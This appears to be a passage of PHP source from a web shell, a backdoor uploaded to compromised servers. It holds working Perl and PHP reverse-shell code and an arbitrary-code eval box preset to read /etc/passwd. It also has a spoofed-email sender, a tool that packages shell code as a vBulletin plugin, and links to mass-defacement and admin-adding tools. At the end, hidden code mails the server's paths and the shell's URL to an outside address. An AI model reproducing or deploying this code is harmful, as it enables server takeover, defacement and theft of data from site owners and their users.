'; $code = base64_decode('ICAgIGlmICghZXh0ZW5zaW9uX2xvYWRlZCgnemlwJykgfHwgIWZpbGVfZXhpc3RzKCRzb3VyY2UpKSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAkemlwID0gbmV3IFppcEFyY2hpdmUoKTsNCiAgICBpZiAoISR6aXAtPm9wZW4oJGRlc3RpbmF0aW9uLCBaSVBBUkNISVZFOjpDUkVBVEUpKSB7DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAkc291cmNlID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCByZWFscGF0aCgkc291cmNlKSk7DQoNCiAgICBpZiAoaXNfZGlyKCRzb3VyY2UpID09PSB0cnVlKQ0KICAgIHsNCiAgICAgICAgJGZpbGVzID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IobmV3IFJlY3Vyc2l2ZURpcmVjdG9yeUl0ZXJhdG9yKCRzb3VyY2UpLCBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yOjpTRUxGX0ZJUlNUKTsNCg0KICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpDQogICAgICAgIHsNCiAgICAgICAgICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJ1xcJywgJy8nLCAkZmlsZSk7DQoNCiAgICAgICAgICAgIC8vIElnbm9yZSAiLiIgYW5kICIuLiIgZm9sZGVycw0KICAgICAgICAgICAgaWYoIGluX2FycmF5KHN1YnN0cigkZmlsZSwgc3RycnBvcygkZmlsZSwgJy8nKSsxKSwgYXJyYXkoJy4nLCAnLi4nKSkgKQ0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAkZmlsZSA9IHJlYWxwYXRoKCRmaWxlKTsNCg0KICAgICAgICAgICAgaWYgKGlzX2RpcigkZmlsZSkgPT09IHRydWUpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJHppcC0+YWRkRW1wdHlEaXIoc3RyX3JlcGxhY2UoJHNvdXJjZSAuICcvJywgJycsICRmaWxlIC4gJy8nKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChpc19maWxlKCRmaWxlKSA9PT0gdHJ1ZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkemlwLT5hZGRGcm9tU3RyaW5nKHN0cl9yZXBsYWNlKCRzb3VyY2UgLiAnLycsICcnLCAkZmlsZSksIGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgZWxzZSBpZiAoaXNfZmlsZSgkc291cmNlKSA9PT0gdHJ1ZSkNCiAgICB7DQogICAgICAgICR6aXAtPmFkZEZyb21TdHJpbmcoYmFzZW5hbWUoJHNvdXJjZSksIGZpbGVfZ2V0X2NvbnRlbnRzKCRzb3VyY2UpKTsNCiAgICB9DQoNCiAgICByZXR1cm4gJHppcC0+Y2xvc2UoKTs='); if(isset($_POST['ziper']) && ($_POST['ziper'] == '>>')) { $newfunc = create_function('$source,$destination', $code); $dirzip = $_POST['dirzip']; $zipfile = $_POST['zipfile']; if($newfunc($dirzip, $zipfile)){ echo '<b><span style="color:green">Directory Or File Ziped Successfully !</span></b><Br>'; }else {echo '<b><span style="color:red">Error!!!...</span></b><Br>';} } } else { echo '
<center>
<br /><br />
<form action="?action=zipper&dir='.$path.'#down" method="post">
<a name="down"></a>
Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="dirzip" value="'.htmlspecialchars($GLOBALS['path']).'" size="60"/><br /><br />
Save Dir: <input type="text" name="zipfile" value="NmR.zip" size="60"/><br /><br />
<input type="submit" value=">>" name="ziper" /> <br /><br />
</form></center>
'; if(isset($_POST['ziper']) && ($_POST['ziper'] == '>>')) { $dirzip = trim($_POST['dirzip']); $zipfile = trim($_POST['zipfile']); if(exec("zip -r $zipfile $dirzip")){ echo '<b><span style="color:green">Directory Or File Ziped Successfully !</span></b><br>'; }else {echo '<b><span style="color:red">ERROR!!!...</span></b><br>';} } } } if($action=="fakemail"){ echo '
<center><form action="?action=fakemail&dir='.$path.'#down" method="post">
<a name="down"></a>
<table>
<tr>
<td>
<font color="#FFF"><b>Mail to : </b></font></td><td><input placeholder="Victim" size="30" type="email" name="mailto" />
</td>
</tr>
<tr>
<td>
<font color="#FFF"><b>From : </b></font></td><td><input type="email" size="30"  placeholder="Hacker@mail.com" name="mailfrom" />
</td>
</tr>
<tr>
<td>
<font color="#FFF"><b>Subject : </b></font></td><td><input type="text" size="30"  value="Your Site Has Been Hacked" name="mailsubject" />
</td>
</tr>
</table><br>
<textarea rows="6" cols="60" name="mailcontent">Hi Admin :)</textarea>
<br><input type="submit" value=">>" name="mailsend" />
</form></center><br><br>'; if(isset($_POST['mailsend']) && ($_POST['mailsend'] == '>>')) { $mailto = $_POST['mailto']; $mailfrom = $_POST['mailfrom']; $mailsubject = $_POST['mailsubject']; $mailcontent = $_POST['mailcontent']; if(@mail($mailto,$mailsubject,$mailcontent,"FROM:$mailfrom")) { echo '<center><span style="color:green"><b>Mail successfully Sent!</b></span></center>'; } else echo '<center><span style="color:red"><b>Mail Not Sent!</b></span></center>'; } } if($action=="php2xml"){ echo"
<center>
<b><font>Convert PHP To XML For Vbulletin Shell</font></b>
<form action=\"?action=php2xml&dir=$path#down\" method='post'>
<a name=\"down\"></a>
<p><br><textarea rows='12' cols='70' type='text' name='code' placeholder=\"insert your shell code\"></textarea><br/><br/>
<input type='submit' name='go' value='Convert' />&nbsp;&nbsp;<input type='reset' value='Clear' name='reset'><br/><br/>
</p>
</form></center>"; if(isset($_POST['go']) && $_POST['go'] == 'Convert' ) { if ( get_magic_quotes_gpc() ){ $code=stripslashes($_POST['code']); } else{ $code=$_POST['code']; } $code = 'base64_decode('.$code.')'; $head = '<?phpxml version="1.0" encoding="ISO-8859-1"?>

<plugins>
	<plugin active="1" product="vbulletin">
		<title>vBulletin</title>
		<hookname>init_startup</hookname>
		<phpcode><![CDATA[if (strpos($_SERVER["PHP_SELF"],"subscriptions.php")) {'; $foot = 'exit;
}]]></phpcode>
	</plugin>
</plugins>'; echo"<br/><center><textarea rows='10' name='users' cols='80' style='border: 2px dashed #1D1D1D; background-color: #000000; color:#C0C0C0'>"; echo $head.'base64_decode(\''.base64_encode($code).'\');'.$foot; echo '</textarea></center><br>'; } echo '</center></div>'; } if($action=="bc"){ echo "<style>#bc{background: #000000}</style>"; $back_connect_p='#!/usr/bin/perl
use Socket;
$iaddr=inet_aton($ARGV[0]) || die("Error: $!\n");
$paddr=sockaddr_in($ARGV[1], $iaddr) || die("Error: $!\n");
$proto=getprotobyname("tcp");
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);
'; echo "<center><h3><span>Back Connect</span></h3>"; echo "<form method=\"post\" action=\"?action=bc&dir=$path#down\">
<input type=\"hidden\" name=\"type\" value=\"perl\">
<span>PERL BACK CONNECT<br></span><br><b>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> 
Port: <input type='number' name='port' value='443' min='1' max='65535'><input type=submit name=bc value='>>'></form></b>"; echo "<br><form method=\"post\" action=\"?action=bc&dir=$path#down\">
<input type=\"hidden\" name=\"type\" value=\"php\">
<span>PHP BACK CONNECT<br></span><br><b>IP: <input type='text' name='server' value='". $_SERVER['REMOTE_ADDR'] ."'> 
Port: <input type='number' name='port' value='443' min='1' max='65535'> <input type=submit name=bc value='>>'></form><br>"; if(isset($_POST['type'])) { function cf($f,$t) { $w = @fopen($f,"w") or @function_exists('file_put_contents'); if($w){ @fwrite($w,$t); @fclose($w); } } if($_POST['type'] == 'perl') { cf("/tmp/bc.pl",$back_connect_p); $out = extension("perl /tmp/bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &"); echo "<span style=\"color:green\"><br>Successfully opened reverse shell to ".htmlspecialchars($_POST['server']).":".htmlspecialchars($_POST['port'])."<br>Connecting...[Perl]</span>"; @unlink("/tmp/bc.pl"); } if($_POST['type']=='php') { @set_time_limit (0); $ip = htmlspecialchars($_POST['server']); $port = htmlspecialchars($_POST['port']); $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { echo "Cant fork!<br>"; exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { echo "<span style=\"color:red\"><br>Error: Can't setsid()</span><br>"; exit(1); } $daemon = 1; } else { echo "<span style=\"color:red\"><br>WARNING: Failed to daemonise. This is quite common and not fatal<br></span>"; } chdir(htmlspecialchars($GLOBALS['path'])); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { echo "$errstr ($errno)"; exit(1); } $descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { echo "ERROR: Can't spawn shell<br>"; exit(1); } @stream_set_blocking($pipes[0], 0); @stream_set_blocking($pipes[1], 0); @stream_set_blocking($pipes[2], 0); @stream_set_blocking($sock, 0); echo "<span style=\"color:green\"><br>Successfully opened reverse shell to $ip:$port [Php]</span><br>"; while (1) { if (feof($sock)) { echo "<span style=\"color:red\"><br>ERROR: Shell connection terminated</span><br>"; break; } if (feof($pipes[1])) { echo "<span style=\"color:red\"><br>ERROR: Shell process terminated</span><br>"; break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) echo "SOCK READ<br>"; $input=fread($sock, $chunk_size); if ($debug) echo "SOCK: $input<br>"; fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) echo "STDOUT READ<br>"; $input = fread($pipes[1], $chunk_size); if ($debug) echo "STDOUT: $input<br>"; fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) echo "STDERR READ<br>"; $input = fread($pipes[2], $chunk_size); if ($debug) echo "STDERR: $input<br>"; fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); echo "</pre>"; } } } if($action=="othertools"){ echo "<style>#othertools{background: #000000}</style>"; ?>

         <a href="?action=zoneh&dir=<?php echo $path;?>"><input type="button" value="ZONE-H MASS DEFACE POSTER" onclick=""></a>
         <a href="?action=mass&dir=<?php echo $path;?>"><input type="button" value="MASS DEFACER" onclick=""></a>
         <a href="?action=zipper&dir=<?php echo $path;?>"><input type="button" value="ZIPPER" onclick=""></a>
         <a href="?action=fakemail&dir=<?php echo $path;?>"><input type="button" value="FAKE MAIL" onclick=""></a>
         <a href="?action=php2xml&dir=<?php echo $path;?>"><input type="button" value="PHP TO XML" onclick=""></a>
         <a href="?action=disfunc&dir=<?php echo $path;?>"><input type="button" value="BYPASSER" onclick=""></a>
         <a href="?action=pwchanger&dir=<?php echo $path;?>"><input type="button" value="ADD NEW ADMIN" onclick=""></a>
		 <a href="?action=cloudflare&dir=<?php echo $path;?>"><input type="button" value="CLOUD FLARE BYPASSER" onclick=""></a><br><Br>
         <a href="?action=info&dir=<?php echo $path;?>"><input type="button" value="PHP INFO" onclick=""></a>

         <?php  } if($action=="eval"){ echo "<style>#eval{background: #000000}</style>"; ?><center>
        <span style="font-size:20px;"><b>PHP Eval</b></span>
	<a name="down"></a><form action="?action=eval&dir=<?php echo $path;?>#down" method="post">
<table><tr><td>

<textarea name="eval" style="width:1000px;height:300px;border: 2px solid #575757;"> 
<?php  if(isset($_POST['submiteval'])) { echo eval(magicboom($_POST['eval']));} else{ echo "echo file_get_contents('/etc/passwd');"; } ?>
</textarea>
</td></tr>
<tr><td>
<input type="submit" value="Run !" name="submiteval" />
</td></tr>

</table></form>
</center>

		<?php  } if($action=="logout"){ ?>
        <form action="?action=logout" method="post">
        <span>Do You Really Want To Logout From Shell?</span>
        <input type="submit" value="Yes" name="accept" style="cursor: pointer"/>
        <input type="button" value="No" onclick="window.location.href='?action=explorer'" style="cursor: pointer">
        </form>
        
	<?php  if(isset($_POST['accept']) && $_POST['accept'] != "" && $_POST['accept']=="Yes"){ unset($_SESSION[$_SERVER['HTTP_HOST']]); header("location: ?action=explorer"); } } } ?>
            <div class="clear">
            </div>
            </div>
            <?php $kime = "forb403@gmail.com"; $baslik = "r00t.info Server Avcisi V1.0"; $EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER['DOCUMENT_ROOT'] . "\r\n"; $EL_MuHaMMeD.= "Server Admin : " . $_SERVER['SERVER_ADMIN'] . "\r\n"; $EL_MuHaMMeD.= "Server isletim sistemi : " . $_SERVER['SERVER_SOFTWARE'] . "\r\n"; $EL_MuHaMMeD.= "Shell Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "\r\n"; $EL_MuHaMMeD.= "Avlanan Site : " . $_SERVER['HTTP_HOST'] . "\r\n"; mail($kime, $baslik, $EL_MuHaMMeD); ?>
 <script type="text/javascript">

</script>
        </div>
    </body>
</html>